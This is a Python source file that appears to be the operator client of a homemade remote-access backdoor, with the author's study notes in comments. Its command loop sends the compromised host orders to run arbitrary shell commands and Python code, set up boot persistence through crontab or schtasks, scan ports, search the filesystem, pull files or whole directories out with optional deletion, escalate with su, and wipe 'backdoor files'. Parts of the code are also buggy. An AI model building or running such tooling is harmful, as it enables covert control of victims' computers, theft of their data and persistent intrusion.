#!/usr/bin/env python3
# FOR PYTHON 3
import socket
import random
import cmd
import argparse
import os
import tempfile
from Crypto.Cipher import Salsa20, AES, PKCS1_OAEP
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
from Crypto.Util import Padding
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
__version__ = '1.0'
__author__ = 'Yoav Rafalin'

# Constants
# IP = '192.168.7.227'
IP = '127.0.0.1'
PORT = 6000
CHUNK_SIZE = [512, 64, 8, 1]
GARBAGE = 12345678

# Important Global Variables
KEY = get_random_bytes(32)
ORIGINAL_KEY = random.randrange(0, 2**16)  # Picking encryption key'

# Setting up runmode
runmode = argparse.ArgumentParser(description='Get runmode')  # Setting up argparse
runmode.add_argument('-a', '--active', action='store_true')
runmode.add_argument('-p', '--passive', action='store_true')
runmode.add_argument('-r', '--reactive', action='store_true')
MODE = vars(runmode.parse_args())  # Turns into dict

# Things I learned:
# static code analysis: looks at code as is without running it (syntax, formatting)
# lints and compilers do this
# lints look at the formatting mostly, and conventions
# control flow graph is a graph which is created and is all the "children" code snippets
# compilers pass over code multiple times to make sure that features are good
# in compression present to user to place fali path if there is no sys.argv[1]
# use
# ending a program with an exception is cosidered bad practice
# map/reduce: phrase used in functional programming languages (like haskell)
# one of the dogmas is that all the variables are immutable
# when your code does not have sideeffects, it is self-contained
# the benefit is you can make it perilized?
# shared resources create a bottleneck
# map gets a function with one input
# reduce gets a function with two inputs and the first is a aggregator of everything that is returned
# use map and reduce from multiprocessing to speed up
# json: interopability
# put everything in json file instead of text file for interblablabla
# complexity: measured by the big O
# the big O notation tells what is the level of complexity
# Fix up consts
# In compression, you can use count instead of the while true and break
# Use precalculating
# Another challenge: use recursive over for loops
# tail call optimization
# binary vs text protocol
# if wanting to used fixed block size, use the below for sending the signal part:
# msg size, msg id, msg data
# look up pipelining
# soa for chat


# Utility functions

# The original encryption algorithm takes a random number and multiplies all of
# the charachter's ASCII values by it. It gets the key to the other side
# by sending it squared.

def encode_with_key(string_to_encode, key=KEY):  # Encrypting and decrypting
    '''Encrypts string_to_encode by creating new Salsa20 cipher object with key
    as the key.

    Args:
        string_to_encode - bytes object to be encrypted by Salsa20 with key
        key - bytes object key used to encrypt string_to_encode, default is KEY'''
    new_cipher = Salsa20.new(key=key)
    encrypted_msg = new_cipher.encrypt(string_to_encode.encode())
    return new_cipher.nonce + encrypted_msg


def original_encode_with_key(string_to_encode, key=KEY):  # Encrypting and decrypting
    '''Encrypts string_to_encode by splitting words into characters, then to
    ASCII from text, multiplying by key, and combining (and returning) the
    numbers with spaces in between.'''
    list_of_numbers = []
    for letter in string_to_encode:
        list_of_numbers.append(str(ord(letter)*key))
    return ' '.join(list_of_numbers).encode()


def decode_with_key(bytes_to_decode, key=KEY):
    '''Decrypts bytes_to_decode by creating new Salsa20 cipher object with a
    nonce (the first 8 chars of bytes_to_decode) and key as key.

    Args:
        bytes_to_decode - bytes object encrypted by Salsa20 with key, and the
        first 8 bytes as nonce
        key - bytes object key used to encrypt bytes_to_decode, default is KEY
    Output:
        decrypted_msg - bytes_to_decode decrypted with key, string object'''
    new_cipher = Salsa20.new(key=key, nonce=bytes_to_decode[:8])
    decrypted_msg = new_cipher.decrypt(bytes_to_decode[8:]).decode('utf-8')
    return decrypted_msg


def original_decode_with_key(bytes_to_decode, key=KEY):
    '''Decodes bytes_to_decode by splitting numbers on spaces, dividing by key,
    converting from ASCII back to text, and stringing (and returning) together
    the characters into text.'''
    string_of_bytes = ''
    list_of_bytes = bytes_to_decode.decode('utf-8').split()
    for letter in list_of_bytes:
        string_of_bytes += chr(int(int(letter)//key))
    return string_of_bytes


def send_message(message_to_send, key, connection, lenoflenofmsg=5):
    '''Does the original sending protocol. Gets length of message_to_send, sends
    it using connection after adjusting to be lenoflenofmsg, and then encodes
    message with key (unless key is None) and sends over connection as well.
    Returns encoded message, as well as the length of the message.'''
    if key is None:
        if type(message_to_send) is bytes:
            message = message_to_send
        else:
            message = str(message_to_send).encode()
    else:
        message = encode_with_key(str(message_to_send), key)
    length_of_msg = str(len(message))
    length_of_msg = ('0' * (lenoflenofmsg-len(length_of_msg))) + length_of_msg  # This part is adding zeros as padding so that it is always 5 chars
    connection.send(length_of_msg.encode())
    connection.send(message)
    return message, length_of_msg


def stream_send_message(message_to_send, key, connection):
    '''Does the sending protocol. Encodes message_to_send with key (unless key
    is None), breaks down into individual bytes and then transfers with
    connection. Returns encoded message.'''
    if key is None:
        message = (str(message_to_send) + '\x00').encode()
        type(message)
    else:
        message = encode_with_key(str(message_to_send + '\x00'), int(key))
    for char in message:
        connection.send(char)
    return message


def recv_message(key, connection, lenoflenofmsg=5, no_decode=False):
    '''Does the original receiving protocol. Recieves length of the message
    (which is lenoflenofmsg long) over connection, then decodes with key
    (unless key is None). Returns decoded message.'''
    length_of_msg = int(connection.recv(lenoflenofmsg))
    if key is None:
        message = connection.recv(length_of_msg)
        if not no_decode:
            message = message.decode('utf-8')
    else:
        message = decode_with_key(connection.recv(length_of_msg), key)
    return message


def stream_recv_message(key, connection):
    '''Does the receiving protocol. Recieves one byte using connection until
    reaches null character, then decodes with key (unless key is None). Returns
    decoded message.'''
    new_message = b''
    while True:
        new_byte = connection.recv(1)
        if new_byte == b'\x00':
            break
        else:
            new_message += new_byte
    if key is None:
        message = new_message.decode('utf-8')
    else:
        message = decode_with_key(new_message, key)
    return message


def original_recv_stream_transfer(file_path, chunk_size, connection):
    '''Receive file using stream protocol. Recieves chunks of size X using
    connection, and then writes them to new file at file_path. The first byte
    of X is to signal the end of the stream: 1 for True, 0 for False. The next
    section will be the length of the length chunk_size, and will specify how
    many bytes from the end are fillers. Lastly, the rest of the chunk will be
    of length chunk_size.'''
    with open(file_path, mode='wb') as local_file:
        while True:
            total_length = chunk_size + len(chunk_size) + 1
            message = connection.recv(total_length)
            metadata = message[:total_length-chunk_size].decode('utf-8')
            local_file.write(message[total_length-chunk_size:(total_length-int(metadata[1:]))])
            if metadata[:1] == '1':
                break


def recv_stream_transfer(file_path, chunk_size, connection):
    '''Receive file using stream protocol. Recieves chunks of size X using
    connection, and then writes them to new file at file_path. The end is
    padded.'''
    total_length = chunk_size + 32
    aes_key = get_random_bytes(24)
    share_key(aes_key, connection)
    with open(file_path, mode='wb') as local_file:
        while True:
            message = connection.recv(total_length)
            aes_nonce = message[:16]
            tag = message[16:32]
            message = message[32:]
            aes_cipher = AES.new(aes_key, AES.MODE_GCM, nonce=aes_nonce)
            decrypted_msg = aes_cipher.decrypt_and_verify(message, tag)
            #decrypted_msg = b''
            #for chunk in range(round(chunk_size/16)):
            #    to_decrypt = message[chunk * 16: (chunk_size + 1) * 16]
            #    if chunk == 0:
            #        decrypted_msg += aes_cipher.decrypt_and_verify(to_decrypt, tag)
            #    else:
            #        decrypted_msg += aes_cipher.decrypt(to_decrypt)
            if message != b'0':
                local_file.write(Padding.unpad(decrypted_msg, 16))
            if len(message) < 512:
                break


def original_recv_chunk_transfer(file_path, connection, key, chunk_sizes=CHUNK_SIZE):
    '''Receive file using chunk protocol. Recieves string with number of chunks
    of certain sizes in chunk_sizes base using connection, and then decodes
    with key. For every part of the list, recives that many chunks of that
    size over connection, and then writes to file at file_path.'''
    with open(file_path, mode='wb') as local_file:
        chunk_numbers = recv_message(key, connection).split()
        cycle = 0
        for num in chunk_numbers:
            for chunk in range(int(num)):
                local_file.write(connection.recv(chunk_sizes[cycle]))
            cycle += 1


def recv_chunk_transfer(file_path, connection, key):
    '''Receive file using chunk protocol. Recieves string with number of chunks
    of certain sizes in chunk_sizes base using connection, and then decodes
    with key. For every part of the list, recives that many chunks of that
    size over connection, and then writes to file at file_path. For the
    smallest size, all are recieved at once, and unpadded.'''
    chunk_sizes = [256, 16]
    aes_key = get_random_bytes(24)
    share_key(aes_key, connection)
    with open(file_path, mode='wb') as local_file:
        chunk_numbers = recv_message(key, connection).split()
        print(chunk_numbers)
        new_chunk_numbers = []
        for num in chunk_numbers:
            new_chunk_numbers.append(int(num))
        chunk_numbers = new_chunk_numbers
        cycle = 0
        for num in chunk_numbers:
            if num != chunk_numbers[-1]:
                for chunk in range(num):
                    message = connection.recv(chunk_sizes[cycle] + 32)
                    aes_nonce = message[:16]
                    tag = message[16:32]
                    message = message[32:]
                    aes_cipher = AES.new(aes_key, AES.MODE_GCM, nonce=aes_nonce)
                    decrypted_msg = aes_cipher.decrypt_and_verify(message, tag)
                    local_file.write(decrypted_msg)
            else:
                message = connection.recv((chunk_sizes[cycle] * num) + 32)
                aes_nonce = message[:16]
                tag = message[16:32]
                message = message[32:]
                aes_cipher = AES.new(aes_key, AES.MODE_GCM, nonce=aes_nonce)
                decrypted_msg = aes_cipher.decrypt_and_verify(message, tag)
                local_file.write(Padding.unpad(decrypted_msg, chunk_sizes[-1]))
            cycle += 1


def share_key(key_to_send, connection):
    '''Sending key protocol. Shares key_to_send over connection by using RSA encryption. The client
    recieves the server public key, while sending the public key from its own
    pair, and encrypts key_to_send with it. It then sends it, along with a hash
    signed by the client private key over connection.'''
    rsa_server_key = RSA.import_key(recv_message(None, connection, no_decode=True))  # Getting server public key
    rsa_client_key = RSA.generate(2048)
    send_message(rsa_client_key.publickey().exportKey(), None, connection)  # Sending client public key
    rsa_cipher = PKCS1_OAEP.new(rsa_server_key)  # Encrypting the salsa20 key
    salsa_key_unsigned = rsa_cipher.encrypt(key_to_send)
    key_signer = pkcs1_15.new(rsa_client_key)
    send_message(key_signer.sign(SHA256.new(data=salsa_key_unsigned)), None, connection)
    send_message(salsa_key_unsigned, None, connection)


# Cmd class
class send_commands(cmd.Cmd):
    intro = 'Run commands on other computer. Type help for help.'
    prompt = 'Enter command: '

    def cmdloop(self, client, system, key=KEY):
        self.key = key
        self.client = client
        self.system = system
        return cmd.Cmd.cmdloop(self)

    def do_exit(self, arg):
        '''Exits program and tells server to do so as well.'''
        message = send_message('exit', self.key, self.client)
        return True

    def do_loggedin(self, arg):
        '''Get current logged in user. Uses os.getlogin. Available for all
        operating systems.'''
        message = send_message('loggedin', self.key, self.client)
        print(recv_message(self.key, self.client))

    def do_WHOAMI(self, arg):
        '''Get current logged in user. Uses os.getlogin. Available for all
        operating systems.'''
        message = send_message('WHOAMI', self.key, self.client)
        print(recv_message(self.key, self.client))

    def do_volume(self, arg):
        '''Set volume. Syntax is "volume number". Uses os module to run
        applescript. Available for Darwin.'''
        if self.system == 'Darwin':
            message = send_message('volume ' + arg, self.key, self.client)

        else:
            print('Action not available with {system}.'.format(self.system))

    def do_say(self, arg):
        '''Announce a phrase on the server. Syntax is "say statement". Uses
        os module to run "say" command on MacOS. Available for Darwin.'''
        if self.system == 'Darwin':
            message = send_message('say ' + arg, self.key, self.client)
        else:
            print('Action not available with {system}.'.format(self.system))

    def do_logout(self, arg):
        '''Logout the other computer. Uses os module to run applescript on
        MacOS, and "shutdown" on Windows. Available for Darwin and Windows.'''
        if self.system == 'Windows' or self.system == 'Darwin':
            message = send_message('logout', self.key, self.client)

        else:
            print('Action not available with {system}.'.format(self.system))

    def do_shutdown(self, arg):
        '''Shutdown the other computer. Uses os module to run applescript on
        MacOS, and "shutdown"  on Windows. Available for Darwin and Windows.'''
        if self.system == 'Windows' or self.system == 'Darwin':
            message, length_of_msg = send_message('shutdown', self.key, self.client)

        else:
            print('Action not available with {system}.'.format(self.system))

    def do_sleep(self, arg):
        '''Sleep the other computer. Uses os module to run "pmset" on MacOS,
        "shutdown" on Windows, and "xset" on Linux. Available for MacOS,
        Windows, and Linux.'''
        if self.system == 'Windows' or self.system == 'Darwin' or self.system == 'Linux':
            message = send_message('sleep', self.key, self.client)

        else:
            print('Action not available with {system}.'.format(self.system))

    def do_exec(self, arg):
        '''Run Python code on the other computer. Syntax is "exec Python
        script". Uses Python exec() function.'''
        message = send_message('exec ' + arg, self.key, self.client)

    def do_cmd(self, arg):
        '''Run a command on the server. Syntax is "cmd command [args]". Uses
        subprocess module. Sudo commands not available.'''
        message = send_message('cmd ' + arg, self.key, self.client)
        print(recv_message(self.key, self.client))

    def do_dir(self, arg):
        '''See directory contents. Syntax is "dir path". Uses os.listdir.
        Available for all operating system.'''
        message = send_message('dir ' + arg, self.key, self.client)
        print('\n' + recv_message(self.key, self.client))

    def do_pers(self, arg):
        '''Set file to run on boot (put in crontab). Uses os module to run
        "crontab" on MacOS and Linux, and "schtasks" on Windows. Available for
        MacOS, Windows, and Linux.'''
        message = send_message('pers', self.key, self.client)
        print(recv_message(self.key, self.client))

    def do_portscan(self, arg):
        '''Scan ports set as range or as number. Syntax is "portscan
        [number-number OR number]". If no number is provided, will
        scan for well known ports. This may take a while. Available for all
        operating systems.'''
        message = send_message('portscan ' + arg, self.key, self.client)
        print(recv_message(self.key, self.client))

    def do_searchword(self, arg):
        '''Search the filesystem for a keyword. Syntax is "searchword keyword
        [ in directory]".'''
        message = send_message('searchword ' + arg, self.key, self.client)
        print('\n' + recv_message(self.key, self.client))

    def do_stream(self, arg):
        '''Stream file from server to current directory. Syntax is "stream [del]
        path". If "del" is included, file will be deleted afterwards.'''
        send_message('stream ' + arg, self.key, self.client)
        message = recv_message(self.key, self.client)
        print(message)
        if message == 'That file exists and will be streamed over.':
            recv_stream_transfer('./{}'.format(arg.split('/')[-1]), 512, self.client)
        elif message == 'That directory exists and its contents will be transfered.':
            cont_signal = input(recv_message(self.key, self.client))
            send_message(cont_signal, self.key, self.client)
            if cont_signal == 'y':
                num_of_files = int(recv_message(self.key, self.client))
                for path in range(num_of_files):
                    file_path = recv_message(self.key, self.client)
                    message = './' + ('/'.join(file_path.split('/')[:-1]))
                    print(message)
                    try:
                        os.makedirs(message)
                    except:
                        pass
                    recv_stream_transfer(file_path, 512, self.client)
        else:
            print('No worky')

    def do_transfer(self, arg):
        '''Transfer file from server to current directory. Syntax is "transfer
        [del] path". if "del" is included, file will be deleted afterwards.'''
        send_message('transfer ' + arg, self.key, self.client)

        message = recv_message(self.key, self.client)
        print(message)
        if message == 'That file exists and will be transfered.':
            print(recv_chunk_transfer('./{}'.format(arg.split('/')[-1]), self.client, self.key))
        elif message == 'That directory exists and its contents will be transfered.':
            cont_signal = input(recv_message(self.key, self.client))
            message = send_message(cont_signal, self.key, self.client)
            if cont_signal == 'y':
                num_of_files = int(recv_message(self.key, self.client))
                for path in range(num_of_files):
                    file_path = recv_message(self.key, self.client)
                    message = './' + ('/'.join(file_path.split('/')[:-1]))
                    print(message)
                    try:
                        os.makedirs(message)
                    except:
                        pass
                    print(recv_chunk_transfer(file_path, self.client, self.key))
        else:
            print('No worky')

    def do_transferto(self, arg):
        '''Transfer specified file to specific directory on server. The
        argument should be where on the other computer you would like to transfer the file.'''
        to_open = input('File path:\n')
        try:
            opened_file = open(to_open, mode='rb')
            print('That file exists and will be transfered.')
            file_open = True
        except:
            print('That file does not exist.')
            file_open = False

        if file_open:
            message = send_message('transferto ' + arg, self.key, self.client)
            print(length_of_msg)
            print(message)
            send_message(to_open, self.key, self.client)
            filesize = os.stat(arg).st_size
            chunk_numbers = []
            for size in CHUNK_SIZE:
                chunk_numbers.append(str(filesize//size))
                filesize = filesize % size
            send_message(' '.join(chunk_numbers), self.key, self.client)
            filesize = os.stat(arg).st_size
            while True:
                if filesize < 1:
                    break
                self.client.send(opened_file.read(1024))
                filesize -= 1024
            opened_file.close()

    def do_ssh(self, arg):
        '''Emulate a ssh onto to the server computer. Some commands from this
        program can also be called from the "command line" such as "transfer",
        "exit/logout", and "su". Sudo commands can also be run if the sudo
        password is placed after the commands.'''
        send_message('ssh', self.key, self.client)
        hostname = recv_message(self.key, self.client)
        user = recv_message(self.key, self.client)
        while True:
            cwd = recv_message(self.key, self.client)  # the cwd may have updated itself the previous loop unlike user or hostname

            if self.system == 'Windows':  # simply trying to emulate native command lines
                command = input(cwd + ' & ')  # "&" is the prompt for the 'yoav' command line
            elif self.system == 'Darwin':
                command = input(hostname + ': ' + cwd.split('/')[-1] + ' ' + user + '& ')
            else:  # linux option
                command = input(user + '@' + hostname + ': ' + cwd + ' & ')

            if 'transfer' == command[:8]:
                send_commands.do_transfer(self, command[9:])
            elif command == 'exit' or command == 'logout':
                send_message(command, self.key, self.client)  # sending the command
                print('Back to normal commands')
                break
            else:
                send_message(command, self.key, self.client)  # sending the command
                if recv_message(self.key, self.client) == 'more':
                    with open('tmpfile.txt', 'w') as tmp_file:
                        pass
                    recv_chunk_transfer(tmp_file, self.client, self.key)
                    with open('tmpfile.txt', 'r') as tmp_file:
                        print(tmp_file.read())
                else:  # the 'less'
                    print(recv_message(self.key, self.client))

    def do_admin(self, arg):
        '''Check if server account is admin. Uses subprocess module. Available
        for MacOS, and Linux.'''
        if self.system == 'Darwin' or self.system == 'Linux':
            message = send_message('admin', self.key, self.client)
            print(recv_message(self.key, self.client))
        else:
            print('Action not available with {system}.'.format(self.system))

    def do_su(self, arg):
        '''Get root access if server account is admin. Syntax is "su password".'''
        if self.system == 'Darwin' or self.system == 'Linux':
            message = send_message('su ' + arg, self.key, self.client)
        else:
            print('Action not available with {system}.'.format(self.system))

    def do_system(self, arg):
        '''Get the server os. Uses platform.system.'''
        message = send_message('system', self.key, self.client)
        self.system = recv_message(self.key, self.client)
        print(self.system)

    def do_uname(self, arg):
        '''Get machine info: node, platform, processor, system version, and
        other info. Syntax is "uname [number]".'''
        message = send_message('uname ' + arg, self.key, self.client)
        print(recv_message(self.key, self.client))

    def do_killattack(self, arg):
        '''Erase all backdoor files on serverside.'''
        print('Are you sure you want to erase all backdoor files on the serverside?')
        erase = input('There is no going back. (y or n) ')
        if erase == 'y':
            message = send_message('killattack', self.key, self.client)
            return True


# Entry point
def main(mode_input=MODE, key_input=KEY, ip_input=IP, port_input=PORT, sendkey=True):
    '''Main function'''

    print(mode_input)

    # Setting up socket
    if (mode_input['active'] is True and mode_input['passive'] is True) or (mode_input['active'] is True and mode_input['reactive'] is True) or (mode_input['reactive'] is True and mode_input['passive'] is True):
        print('Not a valid input')
        raise SystemExit
    elif mode_input['reactive'] is True:
        while True:
            what_type = input('Run a command or a Python script? Type cmd or exec (or exit to stop): ')
            if what_type == 'exit':
                break
            what_to_run = input('Paste it in here:\n')
            os.system('ssh {cmd}@{ip}'.format(cmd='runreactive-'+what_type+'-'+what_to_run, ip=ip_input))
    elif mode_input['passive'] is True:
        connect = socket.socket()
        connect.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # To not get Errno [48] port in use
        connect.bind((ip_input, port_input))
        connect.listen(1)
        client, addr = connect.accept()
    else:
        client = socket.socket()
        try:
            client.connect((ip_input, port_input))
        except Exception as e:
            print('Connection Failed: {}'.format(e))
            raise SystemExit

    if mode_input['reactive'] is False:
        print('key', key_input)
        if sendkey is True:
            share_key(key_input, client)
            #send_message(key_input, None, client)
            #send_message(str(key_input**2), None, client)
        system = recv_message(None, client)
        print('You are connecting to a computer running the {} operating system.'.format(system))
        send_commands().cmdloop(client, system, key_input)
        client.close()
        print('Bye')

if __name__ == '__main__':
    main()
